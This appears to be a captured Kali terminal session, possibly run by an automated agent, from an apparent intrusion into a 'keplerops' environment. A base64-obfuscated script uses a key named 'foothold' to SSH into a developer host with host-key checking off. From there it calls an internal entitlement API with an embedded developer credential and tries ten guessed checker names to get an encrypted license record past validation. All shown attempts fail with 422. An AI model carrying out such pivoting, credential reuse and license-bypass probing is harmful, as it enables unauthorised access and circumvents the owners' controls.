@@ -1,0 +1,30 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k08chk.sh <<'B64EOF'
+> dGltZW91dCAxMjAgc3NoIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD0xMCAtaSB+Ly5zc2gva2VwbGVyb3BzLWZvb3Rob2xkIC1wIDIyMjIgcm93YW5Acm93YW4tZGV2ICcKcHl0aG9uMyAtIDw8IlBZIgppbXBvcnQganNvbixzc2wsYmFzZTY0LHVybGxpYi5yZXF1ZXN0LGl0ZXJ0b29scwpDQT0iL2hvbWUvcm93YW4vLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQiCmN0eD1zc2wuY3JlYXRlX2RlZmF1bHRfY29udGV4dChjYWZpbGU9Q0EpCmJhc2U9Imh0dHBzOi8vZGVsaXZlcnkua2VwbGVyb3BzLnRlc3Q6ODQ0MyIKYXV0aD0iQmFzaWMgIitiYXNlNjQuYjY0ZW5jb2RlKGIicm93YW4uaXRvOmZrX2RldmVsb3Blcl95VVdUS1NxcmMxNnkzSzVfNURmUTdxYWNmdDliLTl4byIpLmRlY29kZSgpCmRlZiByZXEobWV0aG9kLHBhdGgsYm9keT1Ob25lKToKICAgIGRhdGE9anNvbi5kdW1wcyhib2R5KS5lbmNvZGUoKSBpZiBib2R5IGlzIG5vdCBOb25lIGVsc2UgTm9uZQogICAgcj11cmxsaWIucmVxdWVzdC5SZXF1ZXN0KGJhc2UrcGF0aCxkYXRhPWRhdGEsbWV0aG9kPW1ldGhvZCkKICAgIHIuYWRkX2hlYWRlcigiQXV0aG9yaXphdGlvbiIsYXV0aCkKICAgIGlmIGRhdGEgaXMgbm90IE5vbmU6IHIuYWRkX2hlYWRlcigiQ29udGVudC1UeXBlIiwiYXBwbGljYXRpb24vanNvbiIpCiAgICB0cnk6CiAgICAgICAgd2l0aCB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHIsY29udGV4dD1jdHgpIGFzIHJlc3A6CiAgICAgICAgICAgIHJldHVybiByZXNwLnN0YXR1cyxyZXNwLnJlYWQoKS5kZWNvZGUoKQogICAgZXhjZXB0IHVybGxpYi5lcnJvci5IVFRQRXJyb3IgYXMgZToKICAgICAgICByZXR1cm4gZS5jb2RlLGUucmVhZCgpLmRlY29kZSgpCnN0LHR4dD1yZXEoIkdFVCIsIi9hcGkvY29tcGF0aWJpbGl0eS9lbnRpdGxlbWVudHMvRU5ULUFSV0MtRElBRy0wNjk4IikKcmVjPWpzb24ubG9hZHModHh0KQpwcmludCgicmVjb3JkIGtleXMiLGxpc3QocmVjKSkKYmlkPSI2OThkNDJjNmExNzc2ZTlmYzAwMmI5MWVmNjg0MzFhZDc3NWUwYzI4IgojIGZpcnN0OiBjaGVja2VyIHZhcmlhbnRzIHdpdGggZW1wdHkgY29udGV4dCBhbmQgZnVsbCByZWNvcmQKY2hlY2tlcnM9WyJsZWdhY3kiLCJsZWdhY3ktdjEiLCJmaWVsZGtlc3QtZW50aXRsZW1lbnQvdjEiLCJlbnRpdGxlbWVudC92MSIsInYxIiwiZmstZW50aXRsZW1lbnQtbGVnYWN5LTIwMjYtMDgiLCJsZWdhY3ktZW50aXRsZW1lbnQiLCJmaWVsZGtlc3QtbGVnYWN5IiwibGVnYWN5LWVudGl0bGVtZW50L3YxIiwiZmllbGRrZXN0Il0KZm9yIGMgaW4gY2hlY2tlcnM6CiAgICBzLGI9cmVxKCJQT1NUIiwiL2FwaS9jb21wYXRpYmlsaXR5L2VudGl0bGVtZW50cy9jaGVjayIseyJjaGVja2VyIjpjLCJyZWNvcmQiOnJlYywiY29udGV4dCI6e319KQogICAgcHJpbnQoImNrIixyZXByKGMpLHMsYls6MjAwXSkKUFkKJyAyPiYxIHwgaGVhZCAtODAK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k08chk.sh; bash /tmp/k08chk.sh; echo DONEMARK_1795208023929$((6*7))
+record keys ['cipher', 'ciphertext_base64', 'customer_id', 'feature_id', 'grammar', 'key_id', 'nonce_hex', 'package_revision', 'record_id', 'revision', 'schema', 'tag_base64']
+ck 'legacy' 422 {"error":"entitlement_validation_failed"}
+
+ck 'legacy-v1' 422 {"error":"entitlement_validation_failed"}
+
+ck 'fieldkest-entitlement/v1' 422 {"error":"entitlement_validation_failed"}
+
+ck 'entitlement/v1' 422 {"error":"entitlement_validation_failed"}
+
+ck 'v1' 422 {"error":"entitlement_validation_failed"}
+
+ck 'fk-entitlement-legacy-2026-08' 422 {"error":"entitlement_validation_failed"}
+
+ck 'legacy-entitlement' 422 {"error":"entitlement_validation_failed"}
+
+ck 'fieldkest-legacy' 422 {"error":"entitlement_validation_failed"}
+
+ck 'legacy-entitlement/v1' 422 {"error":"entitlement_validation_failed"}
+
+ck 'fieldkest' 422 {"error":"entitlement_validation_failed"}
+
